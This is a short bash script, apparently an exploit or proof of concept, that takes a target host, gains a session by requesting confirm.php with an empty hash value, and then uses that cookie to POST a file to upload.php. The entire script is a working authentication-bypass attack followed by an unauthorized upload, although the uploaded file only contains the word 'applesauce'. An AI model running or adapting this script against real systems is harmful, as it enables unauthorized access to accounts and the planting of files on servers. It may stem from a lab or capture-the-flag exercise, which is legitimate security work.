#!/bin/bash -eu
BASE=$1

FILE=aardvark.txt

echo 'applesauce' > ${FILE}

echo "Logging in with empty hash..."
curl -c cookies.txt "http://${BASE}/confirm.php?hash="
echo "Uploading new file..."
curl -X POST -b cookies.txt "http://${BASE}/upload.php" -d "fileToUpload=${FILE}"
echo -e "\033[32mDone!\033[0m"

rm -f cookies.txt ${FILE}
